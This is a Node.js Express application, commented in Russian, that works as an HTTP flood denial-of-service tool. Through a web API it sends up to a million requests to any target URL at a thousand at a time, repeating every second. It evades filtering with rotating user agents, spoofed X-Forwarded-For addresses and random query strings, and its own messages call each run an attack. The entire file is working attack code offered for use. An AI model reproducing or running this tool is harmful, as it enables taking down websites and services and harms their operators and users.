const express = require('express');
const axios = require('axios');
const async = require('async');
const UserAgent = require('user-agents');
const crypto = require('crypto');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('public'));

let attackInProgress = false;
let successfulRequests = 0;
let failedRequests = 0;
let attackInterval;

// Массив заголовков для запросов
const headers = [
    {
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    },
    {
        'Accept-Language': 'en-GB,en;q=0.5',
        'Cache-Control': 'no-store',
        'Pragma': 'no-cache',
    },
    {
        'Accept-Language': 'fr-FR,fr;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    },
    {
        'Accept-Language': 'es-ES,es;q=0.5',
        'Cache-Control': 'no-store',
        'Pragma': 'no-cache',
    },
    {
        'Accept-Language': 'de-DE,de;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
];

// Генерация фейкового IP
function generateFakeIP() {
    return Array.from({ length: 4 }, () => (Math.floor(Math.random() * 255) + 1)).join('.');
}

// Генерация случайной строки
function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

// Получение случайного элемента массива
function getRandomItemFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Основная функция для отправки запросов
async function sendRequests(target, method, total, concurrent, delay) {
    successfulRequests = 0;
    failedRequests = 0;

    return new Promise((resolve, reject) => {
        async.mapLimit(Array.from({ length: total }), concurrent, async (item, callback) => {
            const randomUserAgent = new UserAgent().toString();
            const randomIP = generateFakeIP();
            const randomHeaders = getRandomItemFromArray(headers);
            const randomData = generateRandomString(100); // Генерация случайных данных для POST и PUT запросов
            const url = `${target}?r=${generateRandomString(10)}`;

            try {
                await axios({
                    method,
                    url,
                    headers: {
                        'User-Agent': randomUserAgent,
                        'X-Forwarded-For': randomIP,
                        ...randomHeaders
                    },
                    data: method === 'GET' ? null : randomData, // Для GET не передаем данные
                    timeout: 5000, // Тайм-аут для предотвращения зависших запросов
                });
                successfulRequests++;
            } catch (error) {
                failedRequests++;
            }

            // Проверяем, является ли callback функцией, и только тогда вызываем ее
            if (typeof callback === 'function') {
                setTimeout(() => callback(null), delay);
            }
        }, (err) => {
            if (err) {
                reject(err);
            } else {
                resolve({ successful: successfulRequests, failed: failedRequests });
            }
        });
    });
}
// Старт атаки
app.post('/api/start', async (req, res) => {
    if (attackInProgress) {
        return res.status(400).json({ error: 'Атака уже запущена' });
    }

    const { target, attackType, concur, totalRequests, delay } = req.body;
    const concurrent = parseInt(concur) || 1000; // Параллельные запросы по умолчанию 1000
    const total = parseInt(totalRequests) || 1000000; // Общее количество запросов по умолчанию 1 миллион
    const requestDelay = parseInt(delay) || 10; // Задержка между запросами

    attackInProgress = true;

    attackInterval = setInterval(async () => {
        const result = await sendRequests(target, attackType, total, concurrent, requestDelay);
        console.log(`Успешные: ${result.successful}, Ошибочные: ${result.failed}`);
    }, 1000); // Запуск каждой секунды

    res.json({ message: 'Атака запущена' });
});

// Остановка атаки и завершение сервера
app.post('/api/stop', (req, res) => {
    if (!attackInProgress) {
        return res.status(400).json({ error: 'Атака не запущена' });
    }

    clearInterval(attackInterval);
    attackInProgress = false;

    res.json({ message: 'Атака остановлена, сервер закрывается' });

    // Завершаем процесс Node.js через небольшую задержку
    setTimeout(() => {
        process.exit(0); // Завершает процесс сервера
    }, 1000); // 1 секунда на завершение
});

// Статус атаки
app.get('/api/status', (req, res) => {
    res.json({ successfulRequests, failedRequests });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
